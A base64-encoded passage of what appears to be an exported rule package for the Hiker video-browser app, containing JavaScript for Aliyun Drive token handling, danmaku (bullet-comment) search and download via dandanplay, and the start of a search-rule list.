ZXBhdGgsXFxcXG4gICAgICAgIGFsaVRva2Vuc0ZpbGVwYXRoXFxcXG4gICAgfSA9ICQucmVxdWlyZShcXFxcXFxcInRva2VuUGF0aFxcXFxcXFwiICsgKE1ZX1RJVExFID8gXFxcXFxcXCI/cnVsZT1cXFxcXFxcIiArIE1ZX1RJVExFIDogXFxcXFxcXCJcXFxcXFxcIikpO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gc2F2ZUFsaVRva2VuKHJlc3VsdCwgYXBpKSB7XFxcXG4gICAgICAgIHdyaXRlRmlsZShhbGlUb2tlbnNGaWxlcGF0aCwgSlNPTi5zdHJpbmdpZnkoYXBpLmFsaVRva2VucykpO1xcXFxuICAgIH1cXFxcblxcXFxuICAgIGZ1bmN0aW9uIHNhdmVPcGVuVG9rZW4ocmVzdWx0LCBhcGkpIHtcXFxcbiAgICAgICAgd3JpdGVGaWxlKG9wZW5Ub2tlbnNGaWxlcGF0aCwgSlNPTi5zdHJpbmdpZnkoYXBpLm9wZW5Ub2tlbnMpKTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBwdXRTaGFyZVRva2VuKHJlc3VsdCkge1xcXFxuICAgICAgICBpZiAoTVlfVElUTEUpIHtcXFxcbiAgICAgICAgICAgIHNoYXJlVG9rZW4gPSBwdXRWYXIoTVlfVElUTEUgKyBcXFxcXFxcIkBcXFxcXFxcIiArIFxcXFxcXFwiYWxpU2hhcmVUb2tlblxcXFxcXFwiLCByZXN1bHQpO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgc2hhcmVUb2tlbiA9IHB1dE15VmFyKFxcXFxcXFwiYWxpU2hhcmVUb2tlblxcXFxcXFwiLCByZXN1bHQpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIGlmICghb3BlblRva2VuICYmIG9wZW5Ub2tlbiAhPT0gbnVsbCAmJiBmaWxlRXhpc3Qob3BlblRva2Vuc0ZpbGVwYXRoKSkge1xcXFxuICAgICAgICBvcGVuVG9rZW4gPSAkLnJlcXVpcmUob3BlblRva2Vuc0ZpbGVwYXRoKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKCFhbGlUb2tlbiAmJiBmaWxlRXhpc3QoYWxpVG9rZW5zRmlsZXBhdGgpKSB7XFxcXG4gICAgICAgIGFsaVRva2VuID0gJC5yZXF1aXJlKGFsaVRva2Vuc0ZpbGVwYXRoKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKE1ZX1RJVExFKSB7XFxcXG4gICAgICAgIHNoYXJlVG9rZW4gPSBnZXRWYXIoTVlfVElUTEUgKyBcXFxcXFxcIkBcXFxcXFxcIiArIFxcXFxcXFwiYWxpU2hhcmVUb2tlblxcXFxcXFwiLCBzaGFyZVRva2VuKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICBzaGFyZVRva2VuID0gZ2V0TXlWYXIoXFxcXFxcXCJhbGlTaGFyZVRva2VuXFxcXFxcXCIsIHNoYXJlVG9rZW4pO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gbmV3IEFsaUFjY2Vzc0FwaShzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgYWxpVG9rZW4sIG9wZW5Ub2tlbiwgcHV0U2hhcmVUb2tlbiwgc2F2ZUFsaVRva2VuLCBzYXZlT3BlblRva2VuKTtcXFxcbn1cXFxcbiQuZXhwb3J0cyA9IEFsaUFjY2Vzc0FwaTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCJUb2tlbui3r+W+hFxcXCIsXFxcInBhdGhcXFwiOlxcXCJ0b2tlblBhdGhcXFwiLFxcXCJydWxlXFxcIjpcXFwiJC5leHBvcnRzPXtcXFxcbiAgICBcXFxcXFxcIm9wZW5Ub2tlbnNGaWxlcGF0aFxcXFxcXFwiOiBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvTG95RGdJay9hbGlPcGVuVG9rZW4uanNvblxcXFxcXFwiLFxcXFxuICAgIFxcXFxcXFwiYWxpVG9rZW5zRmlsZXBhdGhcXFxcXFxcIjogXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL0xveURnSWsvYWxpVG9rZW4uanNvblxcXFxcXFwiXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5by55bmV5bel5YW3XFxcIixcXFwicGF0aFxcXCI6XFxcImRhbm11XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IGJhc2ljVXJsID0gXFxcXFxcXCJodHRwczovL2FwaS5kYW5kYW5wbGF5Lm5ldC9cXFxcXFxcIjtcXFxcbmxldCBzZXZlUGF0aCA9IFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9kYW5tdS9cXFxcXFxcIjtcXFxcbiQuZXhwb3J0cy5nZXREYW5NdSA9IGZ1bmN0aW9uKGtleSkge1xcXFxuICAgIHJldHVybiBKU09OLnBhcnNlKHJlcXVlc3QoYmFzaWNVcmwgKyBcXFxcXFxcImFwaS92Mi9zZWFyY2gvZXBpc29kZXM/YW5pbWU9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoZGVjb2RlVVJJQ29tcG9uZW50KGtleSkpKSk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGVuY29kZUh0bWwocykge1xcXFxuICAgIGxldCBSRUdYX0hUTUxfRU5DT0RFID0gL+KAnHwmfOKAmXxcXFxcXFxcXHUwMDNDfD58W1xcXFxcXFxceDAwLVxcXFxcXFxceDIwXXxbXFxcXFxcXFx4N0YtXFxcXFxcXFx4RkZdfFtcXFxcXFxcXHUwMTAwLVxcXFxcXFxcdTI3MDBdL2c7XFxcXG4gICAgcmV0dXJuIHMucmVwbGFjZShSRUdYX0hUTUxfRU5DT0RFLCBmdW5jdGlvbigkMCkge1xcXFxuICAgICAgICB2YXIgYyA9ICQwLmNoYXJDb2RlQXQoMCksXFxcXG4gICAgICAgICAgICByID0gW1xcXFxcXFwiJiNcXFxcXFxcIl07XFxcXG4gICAgICAgIGMgPSAoYyA9PSAweDIwKSA/IDB4QTAgOiBjO1xcXFxuICAgICAgICByLnB1c2goYyk7XFxcXG4gICAgICAgIHIucHVzaChcXFxcXFxcIjtcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiByLmpvaW4oXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgfSk7XFxcXG59XFxcXG5cXFxcblxcXFxuXFxcXG4vLzDpu5jorqQgMeeugOS9kyAy57mB5L2TXFxcXG4kLmV4cG9ydHMuZG93bmxvYWREYW5NdSA9IGZ1bmN0aW9uKGVwaXNvZGVJZCwgbmFtZSkge1xcXFxuICAgIGxldCBkYW5NdURhdGEgPSBKU09OLnBhcnNlKHJlcXVlc3QoYnVpbGRVcmwoYmFzaWNVcmwgKyBcXFxcXFxcIi9hcGkvdjIvY29tbWVudC9cXFxcXFxcIiArIGVwaXNvZGVJZCwge1xcXFxuICAgICAgICB3aXRoUmVsYXRlZDogdHJ1ZSxcXFxcbiAgICAgICAgY2hDb252ZXJ0OiAxXFxcXG4gICAgfSkpKTtcXFxcbiAgICBsZXQgZE1jb250ZXh0ID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBmb3IgKGxldCBjb21tZW50IG9mIGRhbk11RGF0YS5jb21tZW50cykge1xcXFxuICAgICAgICAvL2RNY29udGV4dCArPSBgPGQgcD1cXFxcXFxcIiR7TWF0aC5yb3VuZCh0aW1lcG9pbnQpfSwke2N0fSwke3NpemV9LCR7Y29sb3J9LDBcXFxcXFxcIj4ke2NvbnRlbnR9PC9kPlxcXFxcXFxcbmA7XFxcXG4gICAgICAgIGxldCBwYXJhbVRleHQgPSBjb21tZW50LnA7XFxcXG4gICAgICAgIGxldCBjb21tZW50VGV4dCA9IGNvbW1lbnQubTtcXFxcbiAgICAgICAgaWYgKHBhcmFtVGV4dCA9PSBudWxsIHx8IGNvbW1lbnRUZXh0ID09IG51bGwpIGNvbnRpbnVlO1xcXFxuICAgICAgICBsZXQgcGFyYW1zID0gcGFyYW1UZXh0LnNwbGl0KFxcXFxcXFwiLFxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IHBhcmFtc1QgPSBbXTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSBpbiBwYXJhbXMpIHtcXFxcbiAgICAgICAgICAgIGlmIChpID09IDMpIHtcXFxcbiAgICAgICAgICAgICAgICAvL+minOiJsuWAvOS4ujDml7bvvIzpu5jorqTorr7nva7kuLrnmb3oibJcXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW1zW2ldID09IFxcXFxcXFwiMFxcXFxcXFwiIHx8IHBhcmFtc1tpXSA9PSBcXFxcXFxcIi0xXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcGFyYW1zVC5wdXNoKFxcXFxcXFwiMTY3NzcyMTVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBpZiAoaSA9PSAyKSB7XFxcXG4gICAgICAgICAgICAgICAgcGFyYW1zVC5wdXNoKFxcXFxcXFwiMjVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBwYXJhbXNULnB1c2gocGFyYW1zW2ldKTtcXFxcblxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHBhcmFtc1QucHVzaChcXFxcXFxcIjBcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgZE1jb250ZXh0ICs9IGA8ZCBwPVxcXFxcXFwiJHtwYXJhbXNULmpvaW4oJywnKX1cXFxcXFxcIj4ke2VuY29kZUh0bWwoY29tbWVudFRleHQpfTwvZD5cXFxcXFxcXG5gO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoIWRNY29udGV4dCkgcmV0dXJuO1xcXFxuICAgIGRNY29udGV4dCA9IGA8P3htbCB2ZXJzaW9uPVxcXFxcXFwiMS4wXFxcXFxcXCIgZW5jb2Rpbmc9XFxcXFxcXCJVVEYtOFxcXFxcXFwiPz48aT5cXFxcXFxcXG4ke2RNY29udGV4dH08L2k+YDtcXFxcbiAgICBsZXQgcGF0aCA9IHNldmVQYXRoICsgbmFtZS5yZXBsYWNlKC9cXFxcXFxcXC8vZyxcXFxcXFxcIl9cXFxcXFxcIikgKyBcXFxcXFxcIl9cXFxcXFxcIiArIGVwaXNvZGVJZCArIFxcXFxcXFwiLnhtbFxcXFxcXFwiO1xcXFxuICAgIHdyaXRlRmlsZShwYXRoLCBkTWNvbnRleHQpO1xcXFxuICAgIHJldHVybiBwYXRoO1xcXFxufVxcXFxuJC5leHBvcnRzLmdldExvY2FsRGFuTXUgPSBmdW5jdGlvbihlcGlzb2RlSWQsIG5hbWUpIHtcXFxcbiAgICBsZXQgcGF0aCA9IHNldmVQYXRoICsgbmFtZS5yZXBsYWNlKC9cXFxcXFxcXC8vZyxcXFxcXFxcIl9cXFxcXFxcIikgKyBcXFxcXFxcIl9cXFxcXFxcIiArIGVwaXNvZGVJZCArIFxcXFxcXFwiLnhtbFxcXFxcXFwiO1xcXFxuICAgIGlmIChmaWxlRXhpc3QocGF0aCkpIHtcXFxcbiAgICAgICAgcmV0dXJuIHBhdGg7XFxcXG4gICAgfVxcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuW8ueW5leaQnOe0oibliqDovb1cXFwiLFxcXCJwYXRoXFxcIjpcXFwibG9hZERtXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IGQgPSBbXTtcXFxcbmxldCBvbmx5RG93bmxvYWQgPSAhIU1ZX1BBUkFNUy5vbmx5RG93bmxvYWQ7XFxcXG5pZiAob25seURvd25sb2FkKSB7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICgpID0+IHtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgIH0pO1xcXFxufVxcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbiAgICB0aXRsZTogXFxcXFxcXCI8Zm9udCBjb2xvcj0nR3JheSc+4p2X5YWz5LqOPGJyPjxzbWFsbD4g5YaF572u5by55bmV5pCc57Si5pWw5o2u5p2l5rqQ5LqOW+W8ueW8uXBsYXldPC9zbWFsbD48L2ZvbnQ+XFxcXFxcXCJcXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbn0pO1xcXFxubGV0IGtleSA9IE1ZX1BBUkFNUy5uYW1lIHx8IGdldE15VmFyKFxcXFxcXFwic1xcXFxcXFwiKSB8fCBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJ0aXRsZVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSkgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5YaF572u5pCc57Si5by55bmVXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKGtleSwgXFxcXFxcXCLor7fmkJzntKLnlarliaflkI3np7BcXFxcXFxcIikuaW5wdXQoKE1ZX1BBUkFNUykgPT4ge1xcXFxuICAgICAgICBzZXRQYWdlUGFyYW1zKE9iamVjdC5hc3NpZ24oTVlfUEFSQU1TLCB7XFxcXG4gICAgICAgICAgICBuYW1lOiBpbnB1dFxcXFxuICAgICAgICB9KSk7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgfSwgTVlfUEFSQU1TKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcImRt55uS5a2Q5pCc57Si5by55bmVXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGtleSwgb25seURvd25sb2FkKSA9PiB7XFxcXG4gICAgICAgIGxldCBkbSA9IGdldFZhcihcXFxcXFxcImRtX3NoYXJlXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoZG0gJiYgIW9ubHlEb3dubG9hZCkge1xcXFxuICAgICAgICAgICAgY2xlYXJWYXIoXFxcXFxcXCJkbV9zaGFyZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hWaWRlb1VybCh7XFxcXG4gICAgICAgICAgICAgICAgZGFubXU6IGRtXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIGJhY2soZmFsc2UpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liqDovb3lrozmiJBcXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAkKGtleSwgXFxcXFxcXCJkbeebkuWtkOaQnOe0olxcXFxcXFwiKS5pbnB1dCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCLkuIvovb3lrozmiJDlvLnluZXlkI7or7fph43mlrDngrnlh7vmkJzntKJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9zZWFyY2g/cnVsZT1kbeebkuWtkCZzPVxcXFxcXFwiICsgaW5wdXQ7XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sIGtleSwgb25seURvd25sb2FkKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5cXFxcbmZ1bmN0aW9uIHNlYXJjaChkLCBuYW1lKSB7XFxcXG4gICAgY29uc3QgZGFubXUgPSAkLnJlcXVpcmUoXFxcXFxcXCJkYW5tdVxcXFxcXFwiKTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsZXQgZG1MaXN0ID0gZGFubXUuZ2V0RGFuTXUobmFtZSk7XFxcXG5cXFxcbiAgICBmb3IgKGxldCBhbmltZSBvZiBkbUxpc3QuYW5pbWVzKSB7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogYW5pbWUuYW5pbWVUaXRsZSxcXFxcbiAgICAgICAgICAgIGRlc2M6IGFuaW1lLnR5cGVEZXNjcmlwdGlvbixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiXFxcXFxcXCIsIFxcXFxcXFwi6K+36L6T5YWl5LiL6L296IyD5Zu0KDEsXFxcXFxcXCIgKyBhbmltZS5lcGlzb2Rlcy5sZW5ndGggKyBcXFxcXFxcIilcXFxcXFxcIikuaW5wdXQoKGFuaW1lVGl0bGUsIGVwaXNvZGVzKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IFthLCBiXSA9IGlucHV0LnNwbGl0KFxcXFxcXFwiLFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBhID0gTnVtYmVyKGEpLCBiID0gTnVtYmVyKGIpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChOdW1iZXIuaXNOYU4oYSkgfHwgTnVtYmVyLmlzTmFOKGIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K+35oyJ5qC85byP6L6T5YWl5pWw5a2XXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmIChhIDwgMSB8fCBiID4gZXBpc29kZXMubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K+36L6T5YWl6KeE5a6a6IyD5Zu05YaF55qE5pWw5a2XXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGNvbnN0IGRhbm11ID0gJC5yZXF1aXJlKFxcXFxcXFwiZGFubXVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IGEgLSAxLCBqID0gMTsgaSA8IGI7IGkrKywgaisrKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXBpc29kZSA9IGVwaXNvZGVzW2ldO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRtVGl0bGUgPSBhbmltZVRpdGxlICsgXFxcXFxcXCJfXFxcXFxcXCIgKyBlcGlzb2RlLmVwaXNvZGVUaXRsZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHNob3dMb2FkaW5nKFxcXFxcXFwi5q2j5Zyo5LiL6L2977yaXFxcXFxcXCIgKyBlcGlzb2RlLmVwaXNvZGVUaXRsZSArIFxcXFxcXFwiXFxcXFxcXFx0KFxcXFxcXFwiICsgaiArIFxcXFxcXFwiL1xcXFxcXFwiICsgKGIgLSBhICsgMSkgKyBcXFxcXFxcIilcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkYW5tdS5kb3dubG9hZERhbk11KGVwaXNvZGUuZXBpc29kZUlkLCBkbVRpdGxlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGhpZGVMb2FkaW5nKCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5ZOm5ZOm5LiL6L295aSx6LSlLi4uXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGhpZGVMb2FkaW5nKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/kuIvovb3lrozmiJBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0sIGFuaW1lLmFuaW1lVGl0bGUsIGFuaW1lLmVwaXNvZGVzKSxcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9tb3ZpZS8xNC5zdmdcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgZm9yIChsZXQgZXBpc29kZSBvZiBhbmltZS5lcGlzb2Rlcykge1xcXFxuICAgICAgICAgICAgbGV0IGRtVGl0bGUgPSBhbmltZS5hbmltZVRpdGxlICsgXFxcXFxcXCJfXFxcXFxcXCIgKyBlcGlzb2RlLmVwaXNvZGVUaXRsZTtcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGVwaXNvZGUuZXBpc29kZVRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogJChlcGlzb2RlLmVwaXNvZGVJZCkubGF6eVJ1bGUoKHVybCwgdGl0bGUsIG9ubHlEb3dubG9hZCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBkYW5tdSA9ICQucmVxdWlyZShcXFxcXFxcImRhbm11XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgcGF0aCA9IGRhbm11LmdldExvY2FsRGFuTXUoaW5wdXQsIHRpdGxlKSB8fCBkYW5tdS5kb3dubG9hZERhbk11KGlucHV0LCB0aXRsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChvbmx5RG93bmxvYWQpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5LiL6L295a6M5oiQXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBkYW5tdVRleHQgPSBmZXRjaChwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFkYW5tdVRleHQpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6L+Y5rKh5pyJ5by55bmV5ZOfflxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoVmlkZW9Vcmwoe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGFubXU6IHBhdGhcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGJhY2soZmFsc2UpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WKoOi9veWujOaIkFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIH0sIE1ZX1BBUkFNUy5kdXJsLCBkbVRpdGxlLCBvbmx5RG93bmxvYWQpLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuW8uuWItuS4i+i9vVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKGVwaXNvZGVUaXRsZSwgZXBpc29kZUlkKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvd0xvYWRpbmcoXFxcXFxcXCLor7fnrYnlvoVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGFubXUgPSAkLnJlcXVpcmUoXFxcXFxcXCJkYW5tdVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYW5tdS5kb3dubG9hZERhbk11KGVwaXNvZGVJZCwgZXBpc29kZVRpdGxlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoaWRlTG9hZGluZygpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6YeN5paw5LiL6L295a6M5oiQ77yM5Y2V5Ye75oyC6L2944CCXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCBkbVRpdGxlLCBlcGlzb2RlLmVwaXNvZGVJZClcXFxcbiAgICAgICAgICAgICAgICAgICAgfV1cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoIWRtTGlzdC5hbmltZXMubGVuZ3RoKSB7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmsqHmnInmib7liLDkuI5bXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCJd55u45YWz55qE5by55bmVXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLmkJzkuI3liLDmgI7kuYjlip7vvJ9cXFxcXFxcXG7mo4Dmn6XlkI3np7DmmK/lkKbmraPnoa7vvJvlj6/ku6XlsJ3or5XliKDpmaTpg6jliIbpmZDlrpror43vvIzlpoLnrKzkuIDlraPnrYnvvJvogIzkuJTlj6rog73mkJzntKLnlarliaflk6bvvIHlhbbku5blvLnluZXlj6/nlKhkbeebkuWtkOOAglxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbn1cXFxcbmxldCBuYW1lID0gZ2V0UGFyYW0oXFxcXFxcXCJuYW1lXFxcXFxcXCIsIE1ZX1BBUkFNUy5uYW1lKTtcXFxcbmlmIChuYW1lKSB7XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgc2VhcmNoKGQsIG5hbWUpO1xcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnEVSUk9S4oCd4oCdXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBkZXNjOiBlLnRvU3RyaW5nKCksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5zZXRSZXN1bHQoZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6KeE5YiZ5YiX6KGoXFxcIixcXFwicGF0aFxcXCI6XFxcInJ1bGVzXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuJC5leHBvcnRzID0gW3tcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCLlsI/kupFcXFxcXFxcIixcXFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXFxcbiAgICAgICAgZmluZChzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgYmFzaWNVcmwgPSBcXFxcXFxcImh0dHBzOi8vd3d3Lnl1bnNvLm5ldFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgbGV0IGFwaSA9IFxcXFxcXFwiL2FwaS92YWxpZGF0ZS9zZWFyY2g/d2Q9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQocykgKyBcXFxcXFxcIiZtb2RlPTkwMDAx